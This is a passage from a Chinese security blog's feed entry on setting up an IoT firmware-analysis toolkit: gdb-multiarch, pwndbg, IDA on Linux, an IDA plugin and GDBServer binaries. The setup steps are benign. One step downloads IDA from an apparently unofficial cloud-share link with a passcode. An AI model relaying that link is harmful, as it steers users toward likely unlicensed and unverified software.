title="GDB"></a>GDB</h2><p>一般的Linux平台下自带了GDB</p><p>调试MIPS平台的程序，需要安装gdb-multiarch</p><pre><code class="shell">sudo apt install gdb-multiarch</code></pre><p>然后按照正常的GDB使用即可</p><h3 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h3><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。</p><pre><code class="shell">git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre><h2 id="IDA-Linux"><a href="#IDA-Linux" class="headerlink" title="IDA(Linux)"></a>IDA(Linux)</h2><p>链接：<a href="https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw</a><br>提取码：076v </p><pre><code class="shell">$ sudo dpkg --add-architecture i386$ sudo apt-get update$ sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 # 安装IDA插件:git clone https://github.com/devttys0/ida.gitcd pluginspython install.py /IDA PATH/ --install </code></pre><h2 id="GDBServer"><a href="#GDBServer" class="headerlink" title="GDBServer"></a>GDBServer</h2><p>各个版本的GDBServer下载地址 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;IoT分析环境搭建&quot;&gt;&lt;a href=&quot;#IoT分析环境搭建&quot; class=&quot;headerlink&quot; title=&quot;IoT分析环境搭建&quot;&gt;&lt;/a&gt;IoT分析环境搭建&lt;/h2&gt;&lt;p&gt;因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。&lt;/p&gt;
&lt;h2 id=&quot;工具列表&quot;&gt;&lt;a href=&quot;#工具列表&quot; class=&quot;headerlink&quot; title=&quot;工具列表:&quot;&gt;&lt;/a&gt;工具列表:&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;binwalk 固件提取&lt;/li&gt;
&lt;li&gt;qemu 模拟执行&lt;/li&gt;
&lt;li&gt;&lt;del&gt;irmadyne 固件模拟工具&lt;/del&gt;(这里没有安装)&lt;/li&gt;
&lt;li&gt;buildroot Mips交叉编译环境&lt;/li&gt;
&lt;li&gt;gdb 调试工具(可编译一个&lt;a href=&quot;https://blog.csdn.net/zqj6893/article/details/84662579&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;mips-linux-gdb&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;IDA&lt;/li&gt;
&lt;li&gt;ghidra&lt;/li&gt;
&lt;li&gt;GDBServer &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="安全" scheme="https://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="IoT" scheme="https://blog.pwntools.xyz/tags/IoT/"/>
    
      <category term="安全" scheme="https://blog.pwntools.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
